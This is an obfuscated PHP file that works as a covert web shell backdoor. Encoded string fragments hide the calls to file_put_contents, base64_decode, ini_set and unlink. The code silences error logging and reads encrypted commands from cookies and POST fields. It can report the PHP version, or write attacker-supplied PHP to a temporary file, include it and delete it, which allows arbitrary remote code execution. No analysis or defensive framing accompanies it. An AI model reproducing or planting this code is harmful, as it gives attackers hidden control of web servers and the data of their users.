<?php $bOTXeXOXE = chr(297-195).chr(105).chr(108).chr(101).chr(95).'p'."\x75".'t'.'_'."\143".chr(111).'n'."\x74".chr(101)."\x6e".chr(116)."\x73";
$Igvsy = "\142"."\141"."\163".'e'."\x36".chr(52)."\137".'d'."\145".chr(987-888).chr(111)."\144".chr(101);
$UlQDEk = chr(341-236)."\x6e".chr(736-631).chr(95)."\x73".chr(556-455).'t';
$HHhGgpeV = 'u'.'n'.chr(108)."\151".chr(110).chr(107);


@$UlQDEk("\x65".chr(114)."\x72"."\157"."\162".'_'.'l'.chr(111).chr(320-217), NULL);
@$UlQDEk("\x6c".'o'."\x67".chr(597-502).'e'.chr(114).'r'.chr(858-747).chr(114).'s', 0);
@$UlQDEk('m'.chr(538-441).chr(120).chr(920-825)."\145"."\x78"."\x65"."\143".chr(117)."\x74"."\x69"."\x6f".chr(110).'_'."\x74"."\151".chr(109)."\145", 0);
@set_time_limit(0);

function QZFHOivn($nguUwRrtKm, $rkKkWntHuU)
{
    $cStsDOiXEB = "";
    for ($KWsAbGenwU = 0; $KWsAbGenwU < strlen($nguUwRrtKm);) {
        for ($j = 0; $j < strlen($rkKkWntHuU) && $KWsAbGenwU < strlen($nguUwRrtKm); $j++, $KWsAbGenwU++) {
            $cStsDOiXEB .= chr(ord($nguUwRrtKm[$KWsAbGenwU]) ^ ord($rkKkWntHuU[$j]));
        }
    }
    return $cStsDOiXEB;
}

$CszGCgL = array_merge($_COOKIE, $_POST);
$PRGJhX = '4e0280d5-d69e-4475-8882-0e7a9c80fbad';
foreach ($CszGCgL as $NACDjtcN => $nguUwRrtKm) {
    $nguUwRrtKm = @unserialize(QZFHOivn(QZFHOivn($Igvsy($nguUwRrtKm), $PRGJhX), $NACDjtcN));
    if (isset($nguUwRrtKm[chr(507-410)."\153"])) {
        if ($nguUwRrtKm[chr(97)] == "\x69") {
            $KWsAbGenwU = array(
                "\160".chr(118) => @phpversion(),
                chr(563-448).chr(118) => "3.5",
            );
            echo @serialize($KWsAbGenwU);
        } elseif ($nguUwRrtKm[chr(97)] == "\145") {
            $qRsvcf = "./" . md5($PRGJhX) . chr(46).'i'."\x6e".chr(99);
            @$bOTXeXOXE($qRsvcf, "<" . chr(957-894).chr(989-877).chr(197-93)."\x70".' '."\100".chr(172-55).'n'.'l'.chr(609-504)."\x6e".chr(906-799)."\50".'_'."\x5f".chr(733-663).'I'."\x4c"."\105".'_'.chr(95)."\51".';'.chr(32) . $nguUwRrtKm["\x64"]);
            include($qRsvcf);
            @$HHhGgpeV($qRsvcf);
        }
        exit();
    }
}

